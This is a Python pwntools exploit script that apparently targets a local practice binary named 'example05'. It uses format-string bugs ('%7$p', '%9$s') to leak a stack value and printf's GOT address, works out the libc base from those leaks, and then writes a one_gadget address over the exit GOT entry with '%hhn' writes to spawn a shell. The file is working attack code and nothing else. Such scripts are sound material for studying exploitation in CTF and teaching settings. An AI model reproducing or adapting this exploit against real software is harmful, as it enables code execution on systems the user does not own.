from pwn import *  # NOQA

p = process('./example05')
gdb.attach(p)
context.arch = 'amd64'

p.sendline('%7$p')
p.recvuntil('Hello ')
line = p.recvline()
random_num = str(int(line[2:10], 16))
p.sendline(random_num)

# p.sendline('%11$p') # Return addr
# p.sendline('AAAAAAAA %8$p') # Print my input
binary = ELF('./example05')
libc = ELF('/nix/store/7p1v1b6ys9fydg5kdqvr5mpr8svhwf4p-glibc-2.31/lib/libc.so.6')
one_gadget_offset = 0xc751d

# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
# one_gdaget_offset = 0xe6ce9

# Note that null bytes will be read, but not printed.

# print(hex(binary.symbols['got.printf']))
p.sendline(b'%9$s    ' + p64(binary.symbols['got.printf']))  # Leak my input
leak = p.recvuntil(b'    ')[:-4]
p.recv()
printf_addr = u64(leak.ljust(8, b'\x00'))
print('printf', hex(printf_addr))

libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
onegadget_addr = libc_base + one_gadget_offset
print('libc base', hex(libc_base))
print('system', hex(system_addr))
print('one_gadget', hex(onegadget_addr))

# fmtstr_payload() pwntools

for i in range(6):
    print(p64(onegadget_addr)[i])

payload = ""
for i in range(6):
    payload += "%" + str(p64(onegadget_addr)[i]) + "c%{}$hhn" + "%" + str(0x100 - p64(onegadget_addr)[i]) + "c"
while len(payload) % 8 != 0:
    payload += 'A'

addresses = b"".join([p64(binary.symbols['got.exit'] + i) for i in range(6)])
start_idx = 8 + len(payload) / 8
full_payload = bytes(payload.format(*[str(int(start_idx + i)) for i in range(6)]), 'utf8') + addresses
print(full_payload)
print(len(full_payload))

p.sendline(full_payload)


p.interactive()
